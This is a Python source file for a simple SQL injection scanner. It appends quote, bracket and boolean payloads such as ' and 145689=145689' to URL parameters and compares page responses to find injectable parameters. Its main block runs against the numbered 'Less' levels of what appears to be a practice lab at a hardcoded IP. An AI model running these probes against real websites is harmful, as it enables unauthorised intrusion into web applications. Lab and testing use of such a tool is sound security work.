import requests
from lib.request.pageparse import Page
from lib.output.output import Output
# from pageparse import Page

class injection_point():
    """
    """
    payloads = ['\'','"',')','%df\'','\')','")']
    number_payloads = [' and 145689=145689',' and 145689=245689']
    string_payloads = ['\' and 145689=145689','\' and 145689=245689']
    suffix_payloads = ['--+','#']
    
    injection_point = None
    injection_url = None

    def __init__(self,url):
        self.url = url
        self.user_agent = 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0'
        self.cookie = ""
        self.headers = {
            'content-type': 'application/json',
            'User-Agent': self.user_agent,
            'cookie': self.cookie
           }
        self.page = Page(self.url)
        self.basicurl, self.urlpath, self.parameter = self.page.parseurl()
        self.output = Output()



    def reload_payloads(self, payloads):
        if  requests.get(self.basicurl,headers = self.headers).status_code != 200:
            raise Exception("request is error!")
        for payload in payloads:
            for j in self.parameter.keys():
                param1 = self.parameter.copy()
                param2 = self.parameter.copy()
                param1[j] = param1[j] + payload
                param2[j] = param2[j] + payload + "-- "
                req = requests.get(self.urlpath,params=param1,headers = self.headers)
                if  (not self.judge_page(param1)) and self.judge_page(param2):          #判断后缀加入闭合符号异常，再追加后缀正常判断注入点
                    self.injection_point, self.injection_url = j, req.url
                    self.output.info_inject(j)
                    return True
        return False


    def number_inject(self):
        for j in self.parameter.keys():
                param1 = self.parameter.copy()
                param2 = self.parameter.copy()
                param1[j] = param1[j] + ' and 145689=145689'
                param2[j] = param2[j] + ' and 145689=245689'
                r1 = requests.get(self.urlpath,params=param1,headers = self.headers)
                r2 = requests.get(self.urlpath,params=param2,headers = self.headers)
                if self.judge_page(param1) and not self.judge_page(param2):
                    self.injection_point, self.injection_url = j, r1.url
                    self.output.info_inject(j)
                    return True
        return False


    def judge_page(self,param):
        r = requests.get(self.urlpath,params=param,headers = self.headers)
        if r.status_code == 200 and "error" not in r.text and "Password" in r.text:
            return True
        else:
            return False

    def judge_inject(self):
        if self.reload_payloads(self.payloads):
            self.output.info(self.injection_url)
        elif self.number_inject():
            self.output.info(self.injection_url)

        
            
if __name__ == '__main__':
    
    for i in range(10):
        print("==========%d========" %(i+1))
        url = F"http://47.95.4.158:8002/Less-{i+1}/?id=1"
        test = injection_point(url)
        test.judge_inject()
        
    

